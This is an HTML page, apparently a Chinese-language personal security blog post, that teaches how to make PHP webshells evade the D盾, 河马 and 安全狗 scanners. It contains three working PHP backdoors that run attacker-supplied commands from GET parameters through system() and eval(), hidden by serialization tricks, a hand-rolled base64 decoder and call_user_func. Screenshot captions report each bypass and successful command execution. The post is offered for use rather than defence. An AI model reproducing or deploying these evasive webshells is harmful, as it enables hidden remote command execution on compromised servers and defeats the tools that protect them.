@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"silver-glacier.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="免杀免杀就是制作开发的病毒木马（脚本或者二进制）不被杀毒软件检测出。 免杀思路分析杀软（WAF）,为什么杀你制作的病毒木马,是规则匹配引擎，是机器学习引擎，等等。只有你知道WAF为什么查杀你，你才知道如何绕过，达到免杀效果。 免杀过程 定位关键点 分析关键点 混淆关键点  杀软类型 本地杀软 云端杀软 二进制杀软 脚本杀软  常用方法 工具免杀 代码膨胀（增加代码量） 多层函数嵌套  本地杀软本地">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP免杀">
+<meta property="og:url" content="https://silver-glacier.github.io/2022/09/11/PHP%E5%85%8D%E6%9D%80/index.html">
+<meta property="og:site_name" content="Glacier&#39;s Blog">
+<meta property="og:description" content="免杀免杀就是制作开发的病毒木马（脚本或者二进制）不被杀毒软件检测出。 免杀思路分析杀软（WAF）,为什么杀你制作的病毒木马,是规则匹配引擎，是机器学习引擎，等等。只有你知道WAF为什么查杀你，你才知道如何绕过，达到免杀效果。 免杀过程 定位关键点 分析关键点 混淆关键点  杀软类型 本地杀软 云端杀软 二进制杀软 脚本杀软  常用方法 工具免杀 代码膨胀（增加代码量） 多层函数嵌套  本地杀软本地">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2022/09/11/dXptJhWv5Zf7V8B.png">
+<meta property="og:image" content="https://s2.loli.net/2022/09/11/N6du4mY2nLStMJq.png">
+<meta property="og:image" content="https://s2.loli.net/2022/09/11/2zX7mR6Ww1tHQvA.png">
+<meta property="og:image" content="https://s2.loli.net/2022/09/11/GeWxXS5IluTyo6m.png">
+<meta property="og:image" content="https://s2.loli.net/2022/09/11/dYfAHs18LGwS9kQ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/09/11/EZmcxgUQ3nAGTpr.png">
+<meta property="og:image" content="https://s2.loli.net/2022/09/11/4sHpu1UyRfSXk8a.png">
+<meta property="og:image" content="https://s2.loli.net/2022/09/11/GODHnIyg2615dqS.png">
+<meta property="og:image" content="https://s2.loli.net/2022/09/11/MIo57bqju1CESeT.png">
+<meta property="og:image" content="https://s2.loli.net/2022/09/11/dE8Bq1hpwFkLYi6.png">
+<meta property="og:image" content="https://s2.loli.net/2022/09/11/I9WHr7kjJp3c2CY.png">
+<meta property="og:image" content="https://s2.loli.net/2022/09/11/iq5KD4AWtwXpIdx.png">
+<meta property="og:image" content="https://s2.loli.net/2022/09/11/VLxrkvyQon2WEp3.png">
+<meta property="og:image" content="https://s2.loli.net/2022/09/11/pKB6mNe7t5Ab24C.png">
+<meta property="og:image" content="https://s2.loli.net/2022/09/11/M9w2AGPfQbXkSLt.png">
+<meta property="og:image" content="https://s2.loli.net/2022/09/11/nCNcuOeiJFK6vzG.png">
+<meta property="og:image" content="https://s2.loli.net/2022/09/11/h8XkPlDoswtg6fB.png">
+<meta property="article:published_time" content="2022-09-11T09:50:12.000Z">
+<meta property="article:modified_time" content="2022-09-11T11:14:52.669Z">
+<meta property="article:author" content="Glacier">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/09/11/dXptJhWv5Zf7V8B.png">
+
+<link rel="canonical" href="https://silver-glacier.github.io/2022/09/11/PHP%E5%85%8D%E6%9D%80/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>PHP免杀 | Glacier's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Glacier's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2022/09/11/PHP%E5%85%8D%E6%9D%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Glacier">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Glacier's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PHP免杀
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-09-11 17:50:12 / Modified: 19:14:52" itemprop="dateCreated datePublished" datetime="2022-09-11T17:50:12+08:00">2022-09-11</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><p>免杀就是制作开发的病毒木马（脚本或者二进制）不被杀毒软件检测出。</p>
+<h2 id="免杀思路"><a href="#免杀思路" class="headerlink" title="免杀思路"></a>免杀思路</h2><p>分析杀软（WAF）,为什么杀你制作的病毒木马,是规则匹配引擎，是机器学习引擎，等等。只有你知道WAF为什么查杀你，你才知道如何绕过，达到免杀效果。</p>
+<h2 id="免杀过程"><a href="#免杀过程" class="headerlink" title="免杀过程"></a>免杀过程</h2><ol>
+<li>定位关键点</li>
+<li>分析关键点</li>
+<li>混淆关键点</li>
+</ol>
+<h2 id="杀软类型"><a href="#杀软类型" class="headerlink" title="杀软类型"></a>杀软类型</h2><ol>
+<li>本地杀软</li>
+<li>云端杀软</li>
+<li>二进制杀软</li>
+<li>脚本杀软</li>
+</ol>
+<h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><ol>
+<li>工具免杀</li>
+<li>代码膨胀（增加代码量）</li>
+<li>多层函数嵌套</li>
+</ol>
+<h3 id="本地杀软"><a href="#本地杀软" class="headerlink" title="本地杀软"></a>本地杀软</h3><p>本地杀软主要是绕过火绒，安全狗，D盾，河马等，而本地杀软对比起其他方式，对于攻击者来说是最友好的，因为本地杀软100%可以确定能不能绕过，只有两个结果，清楚明确，不需要猜测。</p>
+<h4 id="测试免杀D盾"><a href="#测试免杀D盾" class="headerlink" title="测试免杀D盾"></a>测试免杀D盾</h4><p>首先写最简单的一句话木马试试</p>
+<p><img src="https://s2.loli.net/2022/09/11/dXptJhWv5Zf7V8B.png" alt="D盾成功拦截"></p>
+<p>再试试我们常用方法中的代码膨胀，主要是向其注入足够的垃圾数据，来绕过本地杀软软件</p>
+<p><img src="https://s2.loli.net/2022/09/11/N6du4mY2nLStMJq.png" alt="代码膨胀免杀失败"></p>
+<p>按照我们的免杀过程，我们先定位关键点，先判断是否过滤了system函数</p>
+<p><img src="https://s2.loli.net/2022/09/11/2zX7mR6Ww1tHQvA.png" alt="system($a);被查杀"><br><img src="https://s2.loli.net/2022/09/11/GeWxXS5IluTyo6m.png" alt="system();函数能够正常使用"></p>
+<p>因此判断，D盾会检查system函数中的参数，来判断其安全性</p>
+<p>依然是过滤参数，我们先试一下用class是否能绕过<br><img src="https://s2.loli.net/2022/09/11/dYfAHs18LGwS9kQ.png" alt="使用class免杀失败"></p>
+<p>还是被查杀了，既然都想到用类了，那就再序列化试一下<br><img src="https://s2.loli.net/2022/09/11/EZmcxgUQ3nAGTpr.png" alt="序列化免杀成功"></p>
+<p>经过序列化之后，我们成功绕过了，但这样是无法成功执行的，我们只需要截取序列化中的关键词出来就行<br><img src="https://s2.loli.net/2022/09/11/4sHpu1UyRfSXk8a.png" alt="免杀成功"><br><img src="https://s2.loli.net/2022/09/11/GODHnIyg2615dqS.png" alt="命令执行成功"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$cmd</span> = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getC</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$l</span> = <span class="variable">$_GET</span>[<span class="string">&quot;l&quot;</span>];</span><br><span class="line">	system(substr(serialize(getC()),<span class="number">26</span>,<span class="variable">$l</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="测试免杀河马"><a href="#测试免杀河马" class="headerlink" title="测试免杀河马"></a>测试免杀河马</h4><p>我们先尝试用之前成功免杀D盾的代码来测试一下河马</p>
+<p><img src="https://s2.loli.net/2022/09/11/MIo57bqju1CESeT.png" alt="被河马查杀"><br>能绕过D盾的代码直接被河马查杀了</p>
+<p>还是按照上面的思路，我们先定位关键点<br><img src="https://s2.loli.net/2022/09/11/dE8Bq1hpwFkLYi6.png"><br>发现河马直接过滤掉了system()，无论是否带有参数都直接查杀，挺狗的<br>接着尝试，发现eval()函数可以使用，但用eval()函数去调用system()也会被查杀<br>用编码绕过试一下</p>
+<p>将<code>system(calc);</code>base64编码得到<code>c3lzdGVtKCdjbGFjJyk7</code><br><img src="https://s2.loli.net/2022/09/11/I9WHr7kjJp3c2CY.png" alt="被河马查杀"></p>
+<p>仍然不能绕过，貌似会检测到base64_decode函数，网上找一个手写的脚本，改个函数名试试</p>
+<p><img src="https://s2.loli.net/2022/09/11/iq5KD4AWtwXpIdx.png" alt="还是被查杀"><br>好怪啊，怎么这样还是被查杀，莫非是河马自己后台用php跑一遍测试，或者是跟随了你的代码执行顺序逐句查杀</p>
+<p><img src="https://s2.loli.net/2022/09/11/VLxrkvyQon2WEp3.png"><br>不是吧，这样还是被查杀了，按照代码执行顺序也不对呀</p>
+<p>再反复测试，反复调试了一个下午，最后发现</p>
+<blockquote>
+<p>查杀了注释！！！</p>
+</blockquote>
+<p><img src="https://s2.loli.net/2022/09/11/pKB6mNe7t5Ab24C.png" alt="成功免杀"><br>这次终于对了，删掉了注释，按照代码执行顺序，执行不到eval()函数，成功绕过了河马<br>那我们接下来只需要让它无法判断是否该执行if条件中的语句，就能成功绕过</p>
+<p><img src="https://s2.loli.net/2022/09/11/M9w2AGPfQbXkSLt.png" alt="成功执行命令"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Glacier</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$keyStr</span> = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span><br><span class="line">	<span class="variable">$chr1</span> = <span class="variable">$chr2</span> = <span class="variable">$chr3</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="variable">$enc1</span> = <span class="variable">$enc2</span> = <span class="variable">$enc3</span> = <span class="variable">$enc4</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$input</span> = preg_replace(<span class="string">&quot;[^A-Za-z0-9\+\/\=]&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="variable">$enc1</span> = strpos(<span class="variable">$keyStr</span>, substr(<span class="variable">$input</span>, <span class="variable">$i</span>++, <span class="number">1</span>));</span><br><span class="line">		<span class="variable">$enc2</span> = strpos(<span class="variable">$keyStr</span>, substr(<span class="variable">$input</span>, <span class="variable">$i</span>++, <span class="number">1</span>));</span><br><span class="line">		<span class="variable">$enc3</span> = strpos(<span class="variable">$keyStr</span>, substr(<span class="variable">$input</span>, <span class="variable">$i</span>++, <span class="number">1</span>));</span><br><span class="line">		<span class="variable">$enc4</span> = strpos(<span class="variable">$keyStr</span>, substr(<span class="variable">$input</span>, <span class="variable">$i</span>++, <span class="number">1</span>));</span><br><span class="line">		<span class="variable">$chr1</span> = (<span class="variable">$enc1</span> &lt;&lt; <span class="number">2</span>) | (<span class="variable">$enc2</span> &gt;&gt; <span class="number">4</span>);</span><br><span class="line">		<span class="variable">$chr2</span> = ((<span class="variable">$enc2</span> &amp; <span class="number">15</span>) &lt;&lt; <span class="number">4</span>) | (<span class="variable">$enc3</span> &gt;&gt; <span class="number">2</span>);</span><br><span class="line">		<span class="variable">$chr3</span> = ((<span class="variable">$enc3</span> &amp; <span class="number">3</span>) &lt;&lt; <span class="number">6</span>) | <span class="variable">$enc4</span>;</span><br><span class="line">		<span class="variable">$output</span> = <span class="variable">$output</span> . chr((<span class="keyword">int</span>) <span class="variable">$chr1</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$enc3</span> != <span class="number">64</span>) &#123;</span><br><span class="line">			<span class="variable">$output</span> = <span class="variable">$output</span> . chr((<span class="keyword">int</span>) <span class="variable">$chr2</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$enc4</span> != <span class="number">64</span>) &#123;</span><br><span class="line">			<span class="variable">$output</span> = <span class="variable">$output</span> . chr((<span class="keyword">int</span>) <span class="variable">$chr3</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$chr1</span> = <span class="variable">$chr2</span> = <span class="variable">$chr3</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="variable">$enc1</span> = <span class="variable">$enc2</span> = <span class="variable">$enc3</span> = <span class="variable">$enc4</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="variable">$i</span> &lt; strlen(<span class="variable">$input</span>));</span><br><span class="line">	<span class="keyword">return</span> urldecode(<span class="variable">$output</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = Glacier(<span class="string">&quot;c3lzdGVtKCdjYWxjJyk7&quot;</span>); </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>] &gt; <span class="variable">$_GET</span>[<span class="string">&quot;b&quot;</span>])&#123;</span><br><span class="line">	<span class="keyword">eval</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的函数是用的网上别人手写的base64，其实也可以直接用php库中的其他编码形式来绕过河马。</p>
+<h4 id="测试免杀safedog"><a href="#测试免杀safedog" class="headerlink" title="测试免杀safedog"></a>测试免杀safedog</h4><p>使用绕过河马的exp会被safedog拦截，测试发现其是逻辑过滤了eval的参数，那我们换个php的原生函数试一试</p>
+<p>这里的分析过程与上面类似，我们使用了php的原生函数<code>call_user_fnuc(&quot;aa&quot;,$_GET[&quot;a&quot;])</code><br>这里直接贴上exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aa</span> (<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">    system(<span class="variable">$cc</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(call_user_func(<span class="string">&quot;aa&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/09/11/nCNcuOeiJFK6vzG.png" alt="成功绕过安全狗"><br><img src="https://s2.loli.net/2022/09/11/h8XkPlDoswtg6fB.png" alt="命令执行成功"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%85%8D%E6%9D%80/" rel="tag"># 免杀</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/08/18/dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib/" rel="prev" title="dll劫持与AheadLib">
+      <i class="fa fa-chevron-left"></i> dll劫持与AheadLib
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%8D%E6%9D%80"><span class="nav-number">1.</span> <span class="nav-text">免杀</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF"><span class="nav-number">1.1.</span> <span class="nav-text">免杀思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E6%9D%80%E8%BF%87%E7%A8%8B"><span class="nav-number">1.2.</span> <span class="nav-text">免杀过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%80%E8%BD%AF%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.3.</span> <span class="nav-text">杀软类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-number">1.4.</span> <span class="nav-text">常用方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%9D%80%E8%BD%AF"><span class="nav-number">1.4.1.</span> <span class="nav-text">本地杀软</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E5%85%8D%E6%9D%80D%E7%9B%BE"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">测试免杀D盾</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E5%85%8D%E6%9D%80%E6%B2%B3%E9%A9%AC"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">测试免杀河马</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E5%85%8D%E6%9D%80safedog"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">测试免杀safedog</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Glacier</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Glacier</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
